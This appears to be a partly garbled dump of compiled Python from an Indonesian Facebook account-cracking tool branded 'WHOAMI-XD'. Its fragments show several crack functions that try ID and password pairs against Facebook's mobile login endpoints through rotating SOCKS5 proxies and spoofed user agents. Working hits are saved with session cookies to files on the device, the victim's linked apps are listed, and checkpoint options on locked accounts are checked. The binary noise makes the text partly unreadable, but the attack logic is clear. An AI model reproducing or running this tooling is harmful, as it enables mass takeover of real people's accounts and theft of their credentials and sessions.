�Hostr�   �sec-ch-ua-mobiler�   r�   r�   �sec-fetch-site�sec-fetch-mode�sec-fetch-destr�   z8https://m.facebook.com/login/device-based/password/?uid=ah  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"a"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified�login_no_pin�Zlsd�jazoestr�   �nextZflow�pass�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%srL   ��.0�key�valuerL   rL   rM   �
<listcomp>�  �    zcrack.<locals>.<listcomp>�  m_pixel_ratio=2.625; wd=412x756r   r�   �	sec-ch-ua�(" Not A;Brand";v="99", "Chromium";v="98"r!  �sec-ch-ua-platform�	"Android"r�   r�   zhttps://m.facebook.comr�   �!application/x-www-form-urlencodedr�   r�   �x-requested-with�XMLHttpRequestr"  r#  r$  r�   �accept-encoding�gzip, deflate, brr�   zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDrp   F�r�   rr   r�   �allow_redirectsZproxies�
checkpointr�   �   ——>r   r�   r�   rJ   r<   zplay-audio data/cp.mp3�c_user��SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�   c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  �   ——> r�   zplay-audio data/ok.mp3r�   c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  r�   �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�rr   r�   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>re   r�   r   )7r�   r�   rh   ri   rj   r�   r]   rl   rX   rY   rH   r+   �loopr�   rt   r#   r  r  �format�floatrZ   r@   �ugen2rB   r�   �proxr�   r�   rC   rE   r�   rG   rD   r�   �joinrr   �get_dict�itemsr�   �keysr   r)   r=   r	  ra   �popen�akunrA   r�   r  rF   r}   r~   r[   r\   )r  r  �borI   �ua2r�   �pw�nip�proxs�p�dataa�koki�heade�po�headapp�coki�kuki�user�infoakun�session�cek2�cek�apkaktif�nok�muncul�hit�apkexprL   rL   rM   r  �  s�   ~




":r$ 


((


(:>.
���r  c                 C   s�  t j�d�g d�t� �d�t� �d�t� �d�t� �d�t� �t� �t� �d�|� �tt	�� �t� �d�t� �d�t
� �t� �t� �d�t� �d�t� �t� �t� �d�t� �d	�tttt	�� �� �t� �d
���f t j��  t�t�}t�t�}t�� }|D �]�}�z�|j�dddd|dddddd�
� |�d|  d �}t�dt|j��� d�t�dt|j��� d�| dd|d�}d�dd� |j!�"� �#� D ��}|d 7 }i d!d�d"d�d#d$�d%d�d&d'�d(d�d)d*�d+d,�d-|�d.d�d/d0�d1d�d2d�d3d�d4d|  d �d5d6�d7d8�d9d:i�}	|j$d;|d<|i|	d=t%d>�}
d?|
j!�"� �&� v �r[t'd@t� dAt� dB| � dC|� t(� �	� t)dDt* dE��| dC | dF � t+�,dG� t-�.| dC | � td7 aW  n�dH|j!�"� �&� v �r9d-dIi}|
j!�"� }d�dJd� |j!�"� �#� D ��}t)dKt/ dE��| dC | dC | dC | dF � | }d}t�� }|jdL||dM�j}|jdN||dM�j}t�0dOt|��}d}|D ]$}|dPt� dt1� |� t� dQt� |dR � dB|d � t� dF�7 }|d7 }�q�dR}t�0dOt|��}dR}|D ]$}|d7 }|dPt� dt� |� t� dQt� |dR � dB|d � t� dF�7 }�q�t'd@t� dSt
� | � dC|� dC|� dF|� dF|� t� �� t+�,dT� td7 aW  nW q� tj2j3�yK   t4�5d� Y q�w td7 ad S )UNr�   u   💐 r�   ZMbasicr�   r;   r  r  r  r  zfree.facebook.comr�   r  rO   r  r  r  r  r�   r  z;https://free.facebook.com/login/device-based/password/?uid=�)&flow=login_no_pin&refsrc=deprecated&_rdrr%  r   r&  z,https://free.facebook.com/login/save-device/r'  r(  r,  c                 S   r-  r.  rL   r/  rL   rL   rM   r3    r4  zcrackfree.<locals>.<listcomp>r5  r   r�   r6  r7  r!  r8  r9  r�   r�   zhttps://free.facebook.comr�   r:  r�   r�   r;  r<  r"  r#  r$  r�   r=  r>  r�   z#ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7�
connection�closezFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0rp   Fr?  rA  r�   rB  r   r�   r�   rJ   r<   zplay-audio .cp.mp3rC  rD  c                 S   r-  r.  rL   r/  rL   rL   rM   r3  -  r4  r�   rF  rG  rH  rI  re   r�   r   rE  zplay-audio .ok.mp3)6rX   rY   rH   rO  r+   rU  r�   rJ  r�   rt   r#   r  ri   r  rl   rh   rK  rL  rZ   r�   r�   r@   rM  rB   r�   r�   r�   rC   rE   r�   rG   rD   r�   rr   rP  rQ  r�   rY  rR  r   r)   r=   r	  ra   rS  rT  rA   r  rF   rj   r}   r~   r[   r\   )r  r  rZ  rI   rV  r�   rW  r[  r\  r]  r^  r_  r`  ra  rb  rc  rd  re  rf  rg  rh  ri  rj  rk  rL   rL   rM   r    sf   �



":z$ 

0:>4
�r  c           !      C   �  t �ttttttg�}td t	t
� }d}t �t�}dd| i}t �t�}t �t�}t�� }	tj�d|tt	t
�ttt|�t|�tf � tj��  |D �]1}
�z|	j�dddd	|d
ddddd�
� |	�d|  d �}t�dt|j���d�t�dt|j���d�| dd|
d�}d� dd� |j!�"� �#� D ��}|d7 }i dd�dd�dd�d d�d!d"�d#d	�d$d%�d&d'�d(|�d)d
�d*d+�d,d�d-d�d.d�d/d|  d �d0d1�d2d3�d4d5i�}|	j$d6|d7|i|d8|d9�}d:|j!�"� �%� v �rEd;t&v �rt'�(| d< |
 � t)| |
� n?d;t*v �r?t+d=� d>| � d?|
� �}t,|d@dA�}t-t,|dBdC�� t.dDt/ dE��| d< |
 d= � t'�(| d< |
 � td7 anW qKW  �n9dF|	j!�"� �%� v �rid(dGi}dHt0v �r�|j!�"� }d� dId� |	j!�"� �#� D ��}t.dJt1 dE��| d< |
 d< | d= � t+d=� d>| � dK|
� dL|� �}t,|dMdA�}t-t,|dNdC�� td7 aW  n�d;t0v �rh|j!�"� }d� dOd� |	j!�"� �#� D ��}t.dJt1 dE��| d< |
 d< | d= � | }dP}t�� }|jdQ||dR�j}|jdS||dR�j}|dT7 }t�2dUt|��}d}|D ]}|dV|� dW|dX � dY|d � dZ�7 }|d7 }�q�dX}|d[7 }t�2dUt|��} dX}| D ]}|d7 }|d\|� dW|dX � dY|d � d]�7 }�q't+d=� d^| � dK|
� dL|� d_|� �}t,|dMdA�}t-t,|d`dC�� td7 aW  nnW qKW qK tj3j4�y}   t5�6da� Y qKw td7 ad S )bNr   �%r  �	socks5://�0   %s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬ztouch.facebook.comr�   r  rO   r  r  r  r  r�   r  z<https://touch.facebook.com/login/device-based/password/?uid=rl  r%  r   r&  z-https://touch.facebook.com/login/save-device/r'  r(  r,  c                 S   r-  r.  rL   r/  rL   rL   rM   r3  s  r4  zcracktouch.<locals>.<listcomp>r5  r   r�   r6  r7  r!  r8  r9  r�   r�   zhttps://touch.facebook.comr�   r:  r�   r�   r;  r<  r"  r#  r$  r�   r=  r>  r�   �#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7rm  rn  zGhttps://touch.facebook.com/login/device-based/validate-password/?shbl=0rp   Fr?  rA  r�   r�   r<   �   [•] ID       : �    [•] PASSWORD : ru   rv   �WHOAMI-XD CP�r�   �/sdcard/WHOAMI-DATA/CP/rJ   rC  rD  r�   c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  �/sdcard/WHOAMI-DATA/OK/�   
[•] PASSWORD : �   
[•] COOKIES  : �greenzWHOAMI-XD OKc                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  r�   rF  rG  rH  �:   
[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] 
rI  �[bold cyan][r�   r   r   �[/bold cyan]
�>   
[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]
�[bold yellow][�[/bold yellow]
�   [bold green][•] ID       : �[/bold green]
�%[bold green]WHOAMI-XD OK[/bold green]r�   �7r�   r�   r]   ri   �kkr�   rj   �hhrJ  r�   r�   rN  r@   rM  rB   r�   rX   rY   rH   r  r  r�   rG   rl   rZ   r�   r�   rC   rE   r�   rD   r�   rO  rr   rP  rQ  r�   rR  �oprekrT  rA   �ceker�princpr   r�   r�   r=   r	  r�   r  rF   r}   r~   r[   r\   �!r  r  �biZpersZfffrX  rY  rI   rV  r�   rW  rZ  r[  r\  r]  r^  ZstatuscpZ	statuscp1r_  r`  ra  ZstatusokZ	statusok1rb  rc  rd  re  rf  rg  rh  ri  rj  rk  rL   rL   rM   r  c  s�   


6
":z

 


(

($(� �!�r  c           !      C   ro  )bNr   rp  r  rq  rr  �mbasic.facebook.comr�   r  rO   r  r  r  r  r�   r  z=https://mbasic.facebook.com/login/device-based/password/?uid=rl  r%  r   r&  z.https://mbasic.facebook.com/login/save-device/r'  r(  r,  c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  zcrackmbasic.<locals>.<listcomp>r5  r   r�   r6  r7  r!  r8  r9  r�   r�   r�   r�   r:  r�   r�   r;  r<  r"  r#  r$  r�   r=  r>  r�   rs  rm  rn  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0rp   Fr?  rA  r�   r�   r<   rt  ru  ru   rv   rv  rw  rx  rJ   rC  rD  r�   c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  ry  rz  r{  r|  r�   c                 S   r-  r.  rL   r/  rL   rL   rM   r3  �  r4  r�   rF  rG  rH  r}  rI  r~  r�   r   r   r  r�  r�  r�  r�  r�  r�  r�   r�  r�  rL   rL   rM   r  �  s�   


6
":z

 


(

($(���r  c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))Nz�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]r�  r�   rO   r�   r:  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gpr  �navigater  �document�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflater�   �r   r�   r�   r�   r�   r�   r�   r;  r"  r#  zsec-fetch-userr$  r�   r=  r�   �%https://mbasic.facebook.com/login.phpr  �Zemailr+  rc   T�r�   r�   r@  r�   �form�Znhr)  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar�   rs   r2  �action�r�   r�   �%s++++ %s|%s ----> CP       %sr�   rJ   r�   r<   r   �optionr   �2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   r�   rC   �sopr�   rD   r�   r�   rG   r   r�   rl   r=   r	  rH   r  r�   r�   r�  r�  r�   r]   )r  rW  rI   �headr�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�crL   rL   rM   r�    s<   $
"
�$ 
� ��r�  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIrw  r�   rf   z] Mulaiz# PROSES CEK OPSI DIMULAIr|  rv   r   r�   r   r�   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr   r�   z{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r�  r�   rO   r�   r:  r�  r�  r  r�  r  r�  r�  r�  r�   r�  r�  r  r�  Tr�  r�   rA  r�  r�  r�   rs   r2  r�  r�  r�  r�  r�  r�  z#%s---> Tidak Dapat Mengecek Opsi%srC  z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr�   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIru   z# DONE)(r�   rT  r�   r�   r�   rl   rj   r�   r   r   r�   �
IndexErrorr[   r\   r�   r]   r�   r�   ri   r�  r�  rX   rY   rZ   rB   r�   rC   r�  r�   rD   rr   rP  rR  r�   r�   rG   r�   r}   r~   r�   )r�  r  rf  ZloveZkesrt   rW  r�  rI   r�   �headerr�  r�  r�  r�   r�  r�  r�  r�  r�  r�   ZdahrL   rL   rM   �cek_opsi%  sr   
"
�($
"
�$
�
�
r�  c              	   C   sF  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr5tdt� dt� dt� d�� nt	t|��D ]}tdt
|d || �dd�tf � q;| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr�tdt� dt� dt� d�� d S t	t|��D ]}tdt|d || �dd�tf � q�d S )NrH  rp   rq   r�   r�  r�   )r�   c                 S   �   g | ]}|j �qS rL   �rD   �r0  �irL   rL   rM   r3  b  �    zcek_apk.<locals>.<listcomp>Zh3r   z
 r�   �!z-] opshh tidak ada aplikasi aktif di akun ini.z   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padarF  c                 S   r�  rL   r�  r�  rL   rL   rM   r3  k  r�  z2] opshh tidak ada aplikasi kadaluarsa di akun ini.ZKedaluwarsaz Kedaluwarsa)rC   rD   r   r�   r�   r�   r   r)   r(   r�   r#   r�   r&   )rd  rp   r   r�  rl   Zgamer�  rL   rL   rM   �cek_apk^  s"   
&
 &�r�  �__main__zgit pullr�   r�   z/sdcard/WHOAMI-DUMPztouch .prox.txtzpkg install play-audioz
	rE  zGunakan Script Ini Sewajarnya
	z Jika Ada Bug/Error Bilang Yahh
	zWHOAMI Sehat Selalu Yah
	z#Semoga Di Mudahkan Rezekinya Amin
	z!Semoga Harimu Menyenangkan Sayangr�   )�rB   Zbs4rx   ra   rX   r�   �datetimer[   rE   Zurllib3Zrich�base64Z
rich.tabler   �meZrich.consoler   r�   r   r�  r�   �concurrent.futuresr   r
  r   ZgpZ
rich.panelr   r�   r   r�   Zrich.markdownr	   r   Zrich.columnsr
   r�   Zrprintr   Z	rich.textr   Ztekz�ImportErrorrb   Z	stdiomaskZinstall�CONrM  r@   Zcokbrutr�   r�   r�  rC   rD   rN  r=   rH   r�   r^   r>   r?   r�   ZxdrJ   Z	randranger�   r�  �d�fr�   rj   r�  �jri   rN   rA   rK   r�   �lZuaku2rl   Zuakrt   r�   rJ  r  r  rT  r�  r�   Z	lisensikur�   rw   r�   Zlisensikunir   r  r+   r(   r#   r&   r   r0   r*   r)   r5   rk   rh   r�  r]   r�  rZ  rg   ZdicZdic2�now�dayZtglrG   �monthZbln�yearZthnr  r	  r_   r`   rd   rm   rc   r|   r�   rz   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r  r  r  r  r�  r�  r�  �__name__�mkdirr\   rL   rL   rL   rM   �<module>   sL  H�����<
B>8
((!*b/(A6A6DPSQ9
J

�